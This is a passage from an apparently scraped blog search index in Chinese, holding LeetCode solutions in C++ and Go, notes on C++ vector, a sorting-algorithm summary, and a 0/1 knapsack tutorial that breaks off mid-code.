public: bool isValid(string s) { int len = s.length(); int tmp; // 用 vector 模拟栈 vector\u0026lt;char\u0026gt; hp; for (int i = 0; i \u0026lt; len; i++) { // 入栈 if (s[i] == \u0026#39;(\u0026#39; || s[i] == \u0026#39;[\u0026#39; || s[i] == \u0026#39;{\u0026#39;) hp.push_back(s[i]);\t// 进栈 else { // 栈空 if (hp.size() == 0)return false; // 取栈顶元素，注意这不是出栈 tmp = hp.back(); // 出栈 if (tmp == \u0026#39;(\u0026#39; \u0026amp;\u0026amp; s[i] == \u0026#39;)\u0026#39; || tmp == \u0026#39;[\u0026#39; \u0026amp;\u0026amp; s[i] == \u0026#39;]\u0026#39; || tmp == \u0026#39;{\u0026#39; \u0026amp;\u0026amp; s[i] == \u0026#39;}\u0026#39;) hp.pop_back(); // 出栈 else return false; } } return hp.size() == 0; } }; Go版本思路及代码 利用数组切片模拟栈进行操作。\n使用map用symbol变量保存匹配规则，只有到右括号的时候才取左括号 申请c保存左括号 依次对字符串s进行遍历 用clen保存c的长度，先判断clen长度是否大于零 不大于零，将这个字符value加入 大于零，同时如果symbol中存在这个字符的key，就和clen最新加入的值进行匹配，匹配成功对c进行切片，把最新加入的值切掉 最后判断c是否为空，空了说明都匹配了 func isValid(s string) bool { var c []byte symbol := map[byte]byte{ \u0026#39;)\u0026#39;: \u0026#39;(\u0026#39;, \u0026#39;]\u0026#39;: \u0026#39;[\u0026#39;, \u0026#39;}\u0026#39;: \u0026#39;{\u0026#39;, } for _, value := range s { clen := len(c) if clen \u0026gt; 0 { if _, ok := symbol[byte(value)]; ok { if c[clen-1] == symbol[byte(value)] { c = c[:clen-1] continue } } } c = append(c, byte(value)) } return len(c) == 0 leetcode026-删除排序数组中的重复项 题目重述 给定一个排序数组，你需要在原地删除重复出现的元素，使得每个元素只出现一次，返回移除后数组的新长度。\n不要使用额外的数组空间，你必须在原地修改输入数组并在使用 O(1) 额外空间的条件下完成。\n示例 1:\r给定数组 nums = [1,1,2], 函数应该返回新的长度 2, 并且原数组 nums 的前两个元素被修改为 1, 2。 你不需要考虑数组中超出新长度后面的元素。\r示例 2:\r给定 nums = [0,0,1,1,1,2,2,3,3,4],\r函数应该返回新的长度 5, 并且原数组 nums 的前五个元素被修改为 0, 1, 2, 3, 4。\r你不需要考虑数组中超出新长度后面的元素。 题解 题解：陈乐乐(C++) BeYanJin(Go)\n这个题目两种代码版本的思路基本相同，以Golang代码为例。\n使用快慢指针的思想来操作数组元素。\n定义慢指针low让它始终指向数组的有序无重复序列的最后一项，即其所指位置的后一项就是有重复元素的项 定义快指针fast让它始终指向数组中没有加入有序无重复序列的第一项 如果nums[fast] != nums[low]，就有nums[low+1] = nums[fast]，然后low++；否则fast++，寻找没有加入无重复序列的那项 C++版本思路及代码 class Solution { public: int removeDuplicates(vector\u0026lt;int\u0026gt; \u0026amp;nums) { if (nums.size() == 0) return 0; int i = 0; for (int j = 1; j \u0026lt; nums.size(); ++j) { if (nums[j] != nums[i]) { i++; nums[i] = nums[j]; } } return i + 1; } }; Go版本思路及代码 func removeDuplicates(nums []int) int { if len(nums) == 0 { return 0 } low := 0 for fast := 0; fast \u0026lt; len(nums); fast++ { if nums[low] != nums[fast] { nums[low+1] = nums[fast] low++ } } return low + 1 } leetcode053-最大子序和 题目重述 给定一个整数数组 nums ，找到一个具有最大和的连续子数组（子数组最少包含一个元素），返回其最大和。\n输入: [-2,1,-3,4,-1,2,1,-5,4],\r输出: 6\r解释: 连续子数组 [4,-1,2,1] 的和最大，为 6。 题解 题解：pinku-2\n动态规划 动态规划的关键点我认为有两个部分： 确定dp数组：dp[i]表示以i结尾的字段的和的最大值 建立状态转移方程：dp[i]的值等于max(dp[i-1],0)+nums[i]，这是因为：如果dp[i]最大并且dp[i-1]大于0，那么dp[i-1]也最大；如果dp[i-1]小于0，那么前面的数就不用加上去了，所以干脆直接取nums[i]。 故有递推公式：$ dp[i] = max(dp[i-1], 0) + nums[i] $ class Solution1 { public: int maxSubArray(vector\u0026lt;int\u0026gt; \u0026amp;nums) { int result = INT_MIN; int numsSize = int(nums.size()); vector\u0026lt;int\u0026gt; dp(numsSize); // dp[i]表示nums中以nums[i]结尾的最大子序和 dp[0] = nums[0]; result = dp[0]; for (int i = 1; i \u0026lt; numsSize; ++i) { dp[i] = max(dp[i - 1] + nums[i], nums[i]); result = max(result, dp[i]); } return result; } }; 分治法 最大子序和是使用分治法解决问题的典型的例子，并且可以用与合并排序相似的算法求解。下面是用分治法解决问题的模板：\n定义基本情况。 将问题分解为子问题并递归地解决它们。 合并子问题的解以获得原始问题的解。 当最大子数组有 n 个数字时：\n若 n==1，返回此元素。 left_sum 为最大子数组前 n/2 个元素，在索引为 (left + right) / 2 的元素属于左子数组。 right_sum 为最大子数组的右子数组，为最后 n/2 的元素。 mid_sum 是包含左右子数组且含索引 (left + right) / 2 的最大值。 class Solution2 { public: int maxSubArray(vector\u0026lt;int\u0026gt; \u0026amp;nums) { int result = INT_MIN; int numsSize = int(nums.size()); result = maxSubArrayHelper(nums, 0, numsSize - 1); return result; } int maxSubArrayHelper(vector\u0026lt;int\u0026gt; \u0026amp;nums, int left, int right) { if (left == right) { return nums[left]; } int mid = (left + right) / 2; int leftSum = maxSubArrayHelper(nums, left, mid); int rightSum = maxSubArrayHelper(nums, mid + 1, right); int midSum = findMaxCrossingSubarray(nums, left, mid, right); int result = max(leftSum, rightSum); result = max(result, midSum); return result; } int findMaxCrossingSubarray(vector\u0026lt;int\u0026gt; \u0026amp;nums, int left, int mid, int right) { int leftSum = INT_MIN; int sum = 0; for (int i = mid; i \u0026gt;= left; i--) { sum += nums[i]; leftSum = max(leftSum, sum); } int rightSum = INT_MIN; sum = 0; for (int i = mid + 1; i \u0026lt;= right; i++) { sum += nums[i]; rightSum = max(rightSum, sum); } return (leftSum + rightSum); } }; ","date":"2020-02-22T21:39:19+08:00","permalink":"https://lizonglingo.github.io/p/leetcode%E7%BA%BF%E6%80%A7%E9%97%AE%E9%A2%98%E5%90%88%E8%BE%91%E6%95%B0%E7%BB%84%E9%93%BE%E8%A1%A8%E6%A0%88%E9%98%9F%E5%88%97/","title":"leetcode线性问题合辑（数组、链表、栈、队列）"},{"content":" 整理自wiki、菜鸟教程、W3Cschool\n什么是Vector Vector 是C++标准程序库中的一个类，可视为会自动扩展容量的数组，以循序(Sequential)的方式维护变量集合。vector的特色有支持随机存取，在集合尾端增删元素很快，但是在集合中间增删元素比较费时。vector是C++标准程序库中的众多容器（container）之一。 vector以模板(泛型)方式实现，可以保存任意类型的变量，包括用户自定义的数据类型，例如：它可以是放置整数（int）类型的 vector、也可以是放置字符串（string）类型的 vector、或者放置用户自定类别（user-defined class）的 vector。(from:wiki)\n向量（Vector）是一个封装了动态大小数组的顺序容器（Sequence Container）。跟任意其它类型容器一样，它能够存放各种类型的对象。可以简单的认为，向量是一个能够存放任意类型的动态数组。(from:runoob)\n在c++中，vector是一个十分有用的容器。它能够像容器一样存放各种类型的对象，简单地说，vector是一个能够存放任意类型的动态数组，能够增加和压缩数据。(from:w3cschool)\n特性 顺序序列：顺序容器中的元素按照严格的线性顺序排序。可以通过元素在序列中的位置访问对应的元素。 动态数组：支持对序列中的任意元素进行快速直接访问，甚至可以通过指针算述进行该操作。操供了在序列末尾相对快速地添加/删除元素的操作。 内存分配器感知：容器使用一个内存分配器对象来动态地处理它的存储需求。 注意⚠\n如果你要表示的向量长度较长（需要为向量内部保存很多数），容易导致内存泄漏，而且效率会很低；\nVector作为函数的参数或者返回值时，需要注意它的写法：\ndouble Distance(vector\u0026lt;int\u0026gt;\u0026amp;a, vector\u0026lt;int\u0026gt;\u0026amp;b)\n使用方法 基本方法 引入头文件 #include \u0026lt;vector\u0026gt; 创建vector对象 vector\u0026lt;int\u0026gt; vec; 在尾部插入一个元素 vec.push_back(a); 在尾部删除一个元素 vec.pop_back(); 使用下标访问 cout \u0026lt;\u0026lt; vec[0] \u0026lt;\u0026lt; endl; 使用迭代器访问 vector\u0026lt;int\u0026gt;::iterator it; for (it = vec.begin(); it != vec.end(); it++) cout \u0026lt;\u0026lt; *it \u0026lt;\u0026lt; endl; 在第i+1个元素前插入a vec.insert(vec.begin()+i,a); 删除第三个元素 vec.erase(vec.begin()+2); 删除区间[i,j-1]，区间从0开始 vec.erase(vec.begin()+i,vec.end()+j); 获取长度 vec.size(); 清空 vec.clear(); 逆序，需要引入头文件#include\u0026lt;algorithm\u0026gt; reverse(vec.begin(),vec.end()); 使用sort排序，需要引入头文件#include\u0026lt;algorithm\u0026gt; sort(vec.begin(),vec.end());\t// 默认升序 /* 通过重写排序算法降序排列 */ bool Comp(const int \u0026amp;a,const int \u0026amp;b) { return a\u0026gt;b; } sort(vec.begin(),vec.end(),Comp);\t// 调用 二维数组定义 方法1：\n#include \u0026lt;string.h\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; int main() { int N = 5, M = 6; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; obj(N); //定义二维动态数组大小5行 for(int i = 0; i \u0026lt; obj.size(); i++)\t//动态二维数组为5行6列，值全为0 { obj[i].resize(M);\t// resize()改变当前使用数据的大小，如果它比当前使用的大，者填充默认值 } for(int i = 0; i\u0026lt; obj.size(); i++)//输出二维动态数组 { for(int j = 0; j \u0026lt; obj[i].size(); j++) { cout \u0026lt;\u0026lt; obj[i][j] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; } return 0; } 方法2：\n#include \u0026lt;string.h\u0026gt; #include \u0026lt;vector\u0026gt; #include \u0026lt;iostream\u0026gt; #include \u0026lt;algorithm\u0026gt; using namespace std; int main() { int N = 5, M = 6; vector\u0026lt;vector\u0026lt;int\u0026gt;\u0026gt; obj(N, vector\u0026lt;int\u0026gt;(M)); //定义二维动态数组5行6列 for(int i = 0; i \u0026lt; obj.size(); i++)\t//输出二维动态数组 { for(int j = 0; j \u0026lt; obj[i].size(); j++) { cout \u0026lt;\u0026lt; obj[i][j] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; \u0026#34;\\n\u0026#34;; } return 0; } 结构体类型元素 注意⚠：结构体要定义为全局！\n#include\u0026lt;stdio.h\u0026gt; #include\u0026lt;algorithm\u0026gt; #include\u0026lt;vector\u0026gt; #include\u0026lt;iostream\u0026gt; using namespace std; typedef struct rect { int id; int length; int width; //对于向量元素是结构体的，可在结构体内部定义比较函数，下面按照id,length,width升序排序。 bool operator\u0026lt; (const rect \u0026amp;a) const { if(id!=a.id) return id\u0026lt;a.id; else { if(length!=a.length) return length\u0026lt;a.length; else return width\u0026lt;a.width; } } }Rect; int main() { vector\u0026lt;Rect\u0026gt; vec; Rect rect; rect.id=1; rect.length=2; rect.width=3; vec.push_back(rect); vector\u0026lt;Rect\u0026gt;::iterator it=vec.begin(); cout\u0026lt;\u0026lt;(*it).id\u0026lt;\u0026lt;\u0026#39; \u0026#39;\u0026lt;\u0026lt;(*it).length\u0026lt;\u0026lt;\u0026#39; \u0026#39;\u0026lt;\u0026lt;(*it).width\u0026lt;\u0026lt;endl; return 0; } ","date":"2020-02-04T00:10:31+08:00","permalink":"https://lizonglingo.github.io/p/c-vector%E7%9A%84%E7%AE%80%E5%8D%95%E8%AF%B4%E6%98%8E/","title":"C++ Vector的简单说明"},{"content":"⏮\n","date":"2020-01-24T23:06:31+08:00","permalink":"https://lizonglingo.github.io/p/2020%E8%83%BD%E4%B8%8D%E8%83%BD%E9%87%8D%E6%96%B0%E5%BC%80%E5%A7%8B/","title":"2020能不能重新开始"},{"content":" 欢迎来到我的小站！🤝\n🏠 关于本站 2020年1月21日，本站完成从coding+hexo的迁移，记住域名是lizonglin313.github.io\n使用Gridea+Github建设\n写一些乱78糟的\n👨‍💻 博主 学生 ⛹ 兴趣爱好 🍜 💻目前喜欢写Go 🎸刺猬 🎤许嵩、周杰伦 📬 联系我 📧lizonglin313@outlook.com ","date":"2020-01-21T19:09:48+08:00","permalink":"https://lizonglingo.github.io/p/%E5%85%B3%E4%BA%8E/","title":"关于"},{"content":" 整理常用的排序算法，主要包括：\n选择排序 冒泡排序 归并排序 快速排序 插入排序 堆排序 策略以及时间开销 排序算法 基于的思想 时间开销 选择排序 蛮力法 O(n^2) 冒泡排序 蛮力法 O(n^2) 归并排序 分治法 O(nlogn) 快速排序 分治法 O(nlogn) 插入排序 减治法 O(n^2) 堆排序 减治法 O(nlogn) 部分排序的核心算法 归并排序 图解 代码 /* 输入：待排序的数组r[n]，待排序区间[s,t] 输出：升序序列r[s]~r[t] 1. 如果s==t，则待排序区间只有一个元素，返回 2. 计算划分重点：m=(s+t)/2 3. 对于前半个子序列以 r[s]~r[m]进行递归，继续划分 4. 对于后半个子序列以 r[m+1]~r[t]进行递归，继续划分 5. 合并划分后的子序列： 5.1 令i=s,j=m+1,k=s 在 i\u0026lt;=m\u0026amp;\u0026amp;j\u0026lt;=t时进行循环 5.1.1 按照升序依次在两个子序列选择元素放入r1[]临时数组，同时改变两个子序列的索引位置 6. 处理某个子序列未放完的元素 7. 将r1复制到r中 8. 待所有递归过程结束，打印r[] */ void MergeSort(int r[],int s,int t){ int m,r1[1000]; if(s==t) return;\t// 此时划分至只有一个元素了 else{ m = (s+t)/2;\t// 继续划分 MergeSort(r,s,m);\t// 划分前半个子序列 MergeSort(r,m+1,t);\t// 划分后半个子序列 Merge(r,r1,s,m,t);\t// 合并划分后的结果 for(int i=s;i\u0026lt;=t;i++){ r[i]=r1[i]; } } } /* 合并函数 */ void Merge(int r[],int r1[],int s,int m,int t){ int i=s; int j=m+1;\t// 分别标记原数组两个子序列的起始位置 int k=s;\t// 标记r1临时数组 while(i\u0026lt;=m\u0026amp;\u0026amp;j\u0026lt;=t){ if(r[i]\u0026lt;=r[j])\tr1[k++]=r[i++]; else\tr1[k++]=r[j++]; } // 进行收尾工作 while(i\u0026lt;=m) r1[k++]=r[i++]; while(j\u0026lt;=t) r1[k++]=r[j++]; } 快速排序 图解 代码 /* 伪代码： （假设以首元素为轴值） 输入：r[n]，first，end 输出：升序排序的r[n] 1. 选定首元素即 r[first] 为轴值 2. 如果first\u0026lt;end 2.1 划分左右区间，获得轴值位置 2.1.1 令 i=first j=end, if i\u0026lt;j 做： 2.1.2 右侧扫描，if r[j]\u0026gt;轴值 j-- ；反之 swap(r[i],r[j]) 2.1.3 左侧扫描，if r[i]\u0026lt;轴值 i++ ；反之 swap(r[i],r[j]) 2.2 返回最后的i即为轴值的最新位置，pivot\u0026lt;-i 2.3 左孩子序列以：r,first,pivot-1 快排 2.4 右孩子序列以：r,pivot+1,end 快排 3. 最后输出排完序的r[n] */ void QuickSort(int r[],int first,int end){ int pivot;\t// 轴值 if(first\u0026lt;end){ pivot=Partition(r,first,end);\t// 划分子序列，pivot是轴值所在位置的索引 QuickSort(r,first,pivot-1);\t// 左子序列快排 QuickSort(r,pivot+1,end);\t// 右子序列快排 } } /* 划分子序列，求解轴值位置 */ int Partition(int r[],int first,int end){ int i=first; int j=end; while(i\u0026lt;j){ while(i\u0026lt;j\u0026amp;\u0026amp;r[i]\u0026lt;=r[j])\tj--; if(i\u0026lt;j){ int temp=r[i]; r[i]=r[j]; r[j]=temp; i++; } while(i\u0026lt;j\u0026amp;\u0026amp;r[i]\u0026lt;=r[j])\ti++; if(i\u0026lt;j){ int temp=r[i]; r[i]=r[j]; r[j]=temp; j--; } } return i; } 插入排序 图解 代码 // 设r[0]为哨兵，实际的数据从r[1]开始 for(int i=2;i\u0026lt;=n;i++){ r[0]=r[i];\t// 使得r[0]一直为无序序列的第一个一个元素 for(int j=i-1;r[0]\u0026lt;r[j];j--){ r[j+1]=r[j];\t// 如果待插入元素比有序序列中某个元素小，这个元素后移 } r[j+1]=r[0]; } 堆排序 图解 代码 /* 伪代码： 输入：r(k+1)~r(n)满足堆的条件，待筛选记录rk 输出：{r(k)\u0026#39;,r(k+1)\u0026#39;,...r(n)\u0026#39;}为大根堆 1. 设置i和j，分别指向要筛选的结点和其左孩子结点 2. 若ri已是叶子，则筛选完毕 否则，比较要筛选结点的左右孩子结点，并将j指向较大的结点 3. 将ri和rj进行比较，有以下两种情况： 3.1 如果ri\u0026gt;rj，则完全二叉树已是堆，筛选完毕 3.2 否则将ri和rj进行交换；令i=j，转步骤2继续执行 */ void HeapSort(int r[],int n){ int i,temp; for(i=(n-1)/2;i\u0026gt;=0;i--){\t// 初始建堆，最后一个分支下标为(n-1)/2 SiftHeap(r,i,n); } for(i=1;i\u0026lt;=n-1;i++){ temp=r[0]; r[0]=r[n-i]; r[n-i]=temp; SiftHeap(r,0,n-i);\t// 只需要调整根节点 } } void SiftHeap(int r[],int k,int n){ int i,j,temp;\t// 置i为要筛的结点，j为i的左孩子 i=k; j=i*2+1; while(j\u0026lt;n){ if(j\u0026lt;n-1\u0026amp;\u0026amp;r[j]\u0026lt;r[j+1]) j++;\t// 比较i的左右孩子，j为较大者 if(r[i]\u0026gt;r[j]) break; else{ // 将被筛结点与结点j交换 temp=r[i]; r[i]=r[j]; r[j]=temp; // 被筛节点位于原来结点j的位置 i=j; j=2*i+1; } } } ","date":"2019-11-21T19:36:24+08:00","permalink":"https://lizonglingo.github.io/p/%E5%B8%B8%E8%A7%81%E7%9A%84%E6%8E%92%E5%BA%8F%E7%AE%97%E6%B3%95%E6%80%BB%E7%BB%93/","title":"常见的排序算法总结"},{"content":" 0/1背包问题是算法中很经典的问题，具体内容题目内容不再赘述，需要请自行搜索..\n蛮力法 思想\n蛮力法的基本思想就是遍历\n时间复杂度\nΩ(2^n)\n代码\n// 伪代码如下 输入：重量{w1,w2,w3,...,wn} 价值{v1,v2,v3,...,vn} 容量C 输出：装入背包物品的编号和最大价值 1. maxValue=0；结果子集S={} 2. 对集合{1,2,3,...,n}每一个子集T，都有： 2.1 初始化背包价值value=0，背包重量weight=0 2.2 对每个子集里的每个元素j 2.2.1 if weight+wj \u0026lt;= C then weight+=wj value+=vj 2.2.2 else 子集元素还没选完就超重，转2进行下一个子集 2.3 进行到此处某个子集中的元素全部放入背包 2.3.1 if value \u0026gt; maxValue then maxValue\u0026lt;-value S\u0026lt;-T 3. 输出S中的元素和maxValue，结束 回溯法 思想\n解空间树 + 使用限定条件进行剪枝\n在状态空间树的任意一个部分解结点处应该有以下两个判定函数：\n1）当前部分解的总重量小于背包容量\n2）当前问题状态下继续向前搜索搜索可以找到比目前已知解的总价值更大的解\n时间复杂度\n本质是蛮力法，时间通常也为指数阶\n代码\n// 伪代码如下 输入：重量W={w0,w1,w2,...,wn} 价值V={v0,v1,v2,...,vn} 容量C 输出：装入背包物品的编号和最大价值 1. maxValue=0；结果子集S={} 2. 将背包的物品按照单位价值降序排序，相应的改变集合W和V 3. 解空间树的层数layer=0，当前重量cw=0，当前价值cv=0，当前所选物品集合cs={}，进行如下的递归 3.1 if layer==n 到达叶子结点 3.1.1 if cv \u0026gt; maxValue then maxValue=cv S=cs 3.2 没有到达叶子结点，for j=1 to 0 3.2.1 判断在此节点处是否满足这两个条件： 1）装入第layer个物品后不超重 2）此节点处期望最大值大于maxValue 如果两个不同时满足，剪枝\t如果同时满足：根据j=1或j=0更新cv,cw,cs 3.2.2 进行下一层 layer+1，cv，cw，cs递归 3.2.3 回滚cv,cw,cs到递归前的值 4. 输出S中的元素和maxValue，结束 // 核心代码 // 计算剩余物品都装下时的最大价值 int Bound_sv(int layer, int cv) { int i = layer; int sv = cv; for (i; i \u0026lt; set_number; i++) { sv += goods[i].value;\t// 剩余物品都装下时的最大价值 } return sv; } // 计算期望最大价值 double Bound(int layer,int cv,int cw){ int i = layer; double sv = double(cv); int cr = capacity - cw; while (i\u0026lt;set_number \u0026amp;\u0026amp; goods[i].weight \u0026lt;= cr) { cr -= goods[i].weight; sv = sv + goods[i].value; i++; } if (i \u0026lt; set_number) sv = sv + goods[i].ave_value * cr; return sv; } // Using back track method to get max value void BackTrack(int layer, int current_value, int current_weight) { // layer代表回溯层数，其余参数分别代表当前价值以及当前重量 //double expect_sumValue = 0;\t// 记录期望价值总和 if (layer == set_number) {\t// if layer bigger than number, over // 注意这个地方，不用大于 ！！！ if (current_value \u0026gt; maxValue) { maxValue = current_value; for (int i = 0; i \u0026lt; set_number; i++) { max_set[i] = current_set[i]; } } } else { for (int j = 0; j \u0026lt;= 1; j++) { current_set[layer] = j; /************************剪枝**************************/ if ( current_weight + current_set[layer] * goods[layer].weight \u0026lt;= capacity \u0026amp;\u0026amp; Bound_sv(layer,current_value) \u0026gt;= maxValue \u0026amp;\u0026amp; Bound(layer,current_value,current_weight) \u0026gt; maxValue ) { // 更新当前背包物品的总重量，目前背包物品的总价值 current_weight += (goods[layer].weight * current_set[layer]); current_value += (goods[layer].value * current_set[layer]); // 继续进行子树的递归 BackTrack(layer + 1, current_value, current_weight); // 递归出来后回滚数据 current_weight -= (goods[layer].weight * current_set[layer]); current_value -= (goods[layer].value * current_set[layer]); } } } } 分支限界法 思想\n广度优先策略搜索解空间树，对待处理的根节点根据限界函数估算目标函数的可能取值，选择目标函数极大或者极小的结点优先进行广度搜索，不断调整搜索方向，尽可能早的找到最优解。\n时间复杂度\n本质还是蛮力法，最坏情况下时间复杂度还是指数阶\n代码\n// 伪代码如下 输入：n个物品的重量w[n]，价值v[n]，背包容量W 输出：背包获得的最大价值和装入背包的物品 1. 根据界限函数计算目标函数的上界up，使用贪心法计算目标函数的下界down 2. 计算根节点的目标函数值并且加入PT表 3. 循环直到某个叶子节点的目标函数值在表PT中去取极大值 3.1 i=PT表中具有最大值的结点 3.2 对结点i的每个孩子结点x执行下述操作： 3.2.1 如果孩子x结点不满足约束条件，则丢弃该节点 3.2.2 否则，估算结点x的目标函数的取值lb，将其加入表PT中 4. 将叶子节点对应的最优解输出，回溯得到最优解的各个分量 int tree_node_id = 1;\t// 解空间树结点id 1开始 int lower_bound = 0;\t// 目标函数的下界 // 贪心法求背包容量的下界 int greed() { int temp[MAX] = { 0 };\t// 定义临时数组，用来表示货物向量，并初始化为0 int cap = capacity;\t// 暂存背包容量 int w = 0;\t// 当前背包容量 int updown = 0;\t// 下界 // 对背包物品按照单位价值进行排序 sort_set(); // 求解 for (int i = 0; i \u0026lt; set_number; i++) { // 如果超重，跳出 if ((w+goods[i].weight) \u0026gt; cap) { continue; } temp[i] = 1; w += goods[i].weight; updown += (temp[i] * goods[i].value); } cout \u0026lt;\u0026lt; \u0026#34;解的下界是：\u0026#34; \u0026lt;\u0026lt; updown \u0026lt;\u0026lt; endl; return updown; } // 限界函数求上界 void limit(ND \u0026amp;n)\t//计算分枝结点的上界 { // 下一个要选的物品就是第layer层物品 int w = n.current_weight; double v = n.current_value; int i = n.layer; while (i \u0026lt; set_number \u0026amp;\u0026amp; w + goods[i].weight \u0026lt;= capacity) { w += goods[i].weight; v += goods[i].value; i++; } if (i \u0026lt; set_number) { // 装部分物品 n.ub = v + (capacity - w)*goods[i].ave_value; } else { n.ub = v; } } // 优先队列进队操作 void EnQueue(ND n, priority_queue\u0026lt;ND\u0026gt; \u0026amp;q) { if (n.layer == set_number) {\t// 已经到达叶子结点 if (n.current_value \u0026gt; maxValue) {\t// 更新maxValue maxValue = n.current_value; for (int i = 0; i \u0026lt; set_number; i++) { max_set[i] = n.cset[i]; } } } else { q.push(n);\t// 非叶子结点进队 } } // 分支限界法 void branchAndbound() { // 首先使用贪心法求解此goods集合的目标值下界 lower_bound = greed(); priority_queue\u0026lt;ND\u0026gt; q;\t// 优先队列 ND n0, n1, n2;\t// 先定义根结点，左孩子结点，右孩子结点 /*初始化根节点*/ n0.id = tree_node_id++;\tn0.layer = 0; n0.current_value = 0; n0.current_weight = 0; for (int i = 0; i \u0026lt; set_number; i++) { n0.cset[i] = 0; } limit(n0);\t// 求根结点上界 q.push(n0);\t// 根结点进队 while (!q.empty())\t// 队不空循环 { n0 = q.top();\t// 取队头 q.pop();\t// 出队 if (n0.current_weight + goods[n0.layer].weight \u0026lt;= capacity \u0026amp;\u0026amp; n0.ub \u0026gt;= lower_bound) {\t// 超重剪枝 小于最小期望重量剪枝 // 设置左孩子结点 n1.id = tree_node_id++; n1.layer = n0.layer + 1; n1.current_weight = n0.current_weight + goods[n0.layer].weight; n1.current_value = n0.current_value + goods[n0.layer].value; /*复制解向量*/ for (int i = 0; i \u0026lt; set_number; i++) { n1.cset[i] = n0.cset[i]; } n1.cset[n1.layer-1] = 1;\t// 更新解向量 limit(n1);\t// 求限界函数上界 EnQueue(n1, q);\t// 左孩子进队 } // 设置右孩子结点 n2.id = tree_node_id++; n2.layer = n0.layer + 1; n2.current_value = n0.current_value; n2.current_weight = n0.current_weight; // 复制解向量 for (int i = 0; i \u0026lt; set_number; i++) { n2.cset[i] = n0.cset[i]; } n2.cset[n2.layer-1] = 0;\t// 更新解向量 limit(n2);\t// 求界限函数上界 if (n2.ub \u0026gt; maxValue \u0026amp;\u0026amp; n2.ub \u0026gt;= lower_bound) {\t// 剪枝，期望最大值小于已有最大值就剪枝 小于最小期望重量剪枝 EnQueue(n2, q); } } } 动态规划 思想\n处理多阶段决策最优化问题，多阶段决策过程满足最优性原理\n1）划分子问题\n2）确定动态规划函数\n3）填表\n贪心法 对于0/1背包来说，贪心法在一些时候是无法求得最优解的，所以不要万不得已还是不要选择贪心法了\n/* 分别用、蛮力法、回溯法和分支限界法 实现0/1背包问题的求解 */ // 蛮力法求解0/1背包 #include \u0026lt;iostream\u0026gt; #include \u0026lt;time.h\u0026gt; #include \u0026lt;algorithm\u0026gt; #include \u0026lt;queue\u0026gt; #include \u0026lt;sys/timeb.h\u0026gt; #include \u0026lt;math.h\u0026gt; using namespace std; #define MAX 100000 // Good is the struct of good which has three elememt typedef struct Good { int value = 0; int weight = 0; double ave_value = 0; }GD; // 定义按照单位重量降序排序的规则 struct sort_rule { bool operator()(const GD \u0026amp;good1, const GD \u0026amp;good2) { return good1.ave_value \u0026gt; good2.ave_value; } }; // 定义用于分支限界法的树结点结构体 /* typedef struct Node { int current_weight = 0;\t// 到达此结点时背包所有物品的总重量 int current_value = 0;\t// 到达此结点时背包所有物品的总价值 double result_of_Obj_func = 0;\t// 此结点的目标函数的值 // bool biggest = true;\t// 是否是此时的最大结点 }ND; */ typedef struct Node { // 分支限界法树结点 int id;\t// 结点编号 int layer;\t// 当前结点所在树的层数 int current_weight = 0;\t// 当前结点的总重量 int current_value = 0;\t// 当前结点的总价值 double ub = 0;\t// 当前结点的限界函数值 int cset[MAX] = { 0 };\t// 当前背包的解向量 bool operator\u0026lt;(const Node\u0026amp; nd) const {\t// 定义优先队列出队规则，限界函数值越大越先出队 return ub \u0026lt; nd.ub; } }ND; // 公用 -\u0026gt; 获取时间函数 long long getSystemTime() { timeb t; ftime(\u0026amp;t); return t.time * 1000 + t.millitm; } class Bag {\t// 基类，用作蛮力法 protected: int set_number;\t// 集合元素个数 int capacity;\t// 背包容量 int maxValue = -1;\t// 最大重量 // 定义时间变量 long long t1; long long t2; long long sum_time = 0; GD goods[MAX]; int max_set[MAX] = { 0 };\t// max_set为标志数组 int current_set[MAX] = { 0 };\t// define current_set to save current set // 初始化重量集合 void set_weights(int N) { int sum_w = 0; for (int i = 0; i \u0026lt; N; i++) { goods[i].weight = (rand() % 10) + 1; sum_w += goods[i].weight; } capacity = sum_w / 2; } // 初始化价值集合 void set_values(int N) { for (int i = 0; i \u0026lt; N; i++) { //values[i] = (rand() % 5 + 1) * 10 + ((rand() % 10) + 1);\t// 产生10-60之间的数值 goods[i].value = (rand() % 5 + 1) * 10 + ((rand() % 11)); } } // 初始化集合 void initialize_set(int N) { set_weights(N); set_values(N); } // 打印重量和价值 void print_wv(int N) { cout \u0026lt;\u0026lt; \u0026#34;物品重量集合为：{ \u0026#34;; for (int i = 0; i \u0026lt; N; i++) { //cout \u0026lt;\u0026lt; weights[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; cout \u0026lt;\u0026lt; goods[i].weight \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; \u0026#34;}\u0026#34; \u0026lt;\u0026lt; endl \u0026lt;\u0026lt; \u0026#34;物品价值集合为：{ \u0026#34;; for (int i = 0; i \u0026lt; N; i++) { //cout \u0026lt;\u0026lt; values[i] \u0026lt;\u0026lt; \u0026#34; \u0026#34;; cout \u0026lt;\u0026lt; goods[i].value \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } cout \u0026lt;\u0026lt; \u0026#34;}\u0026#34; \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;背包容量为：\u0026#34; \u0026lt;\u0026lt; capacity \u0026lt;\u0026lt; endl; } void print_set() {\t// 打印集合 // 输出最大重量以及对应的元素序号 // 如果输出 0 / 1 表示的子集情况例如 {0 1 0 1 1 0 0} 就修改本函数 cout \u0026lt;\u0026lt; \u0026#34;背包能装的最大价值为：\u0026#34; \u0026lt;\u0026lt; maxValue \u0026lt;\u0026lt; endl; cout \u0026lt;\u0026lt; \u0026#34;包含的物品有：{ \u0026#34;; for (int i = 0; i \u0026lt; set_number; i++) { // 输出序号 or 向量 if (max_set[i]) { cout \u0026lt;\u0026lt; i + 1 \u0026lt;\u0026lt; \u0026#34; \u0026#34;; } } cout \u0026lt;\u0026lt; \u0026#34;}\u0026#34; \u0026lt;\u0026lt; endl; } void brute_force(int layer, int current_value, int current_weight) { // layer代表回溯层数，其余参数分别代表当前价值以及当前重量 if (layer == set_number) {\t// if layer bigger than number, over // 注意这个地方，不用大于 ！！！ if (current_value \u0026gt; maxValue \u0026amp;\u0026amp; current_weight \u0026lt;= capacity) { maxValue = current_value; for (int i = 0; i 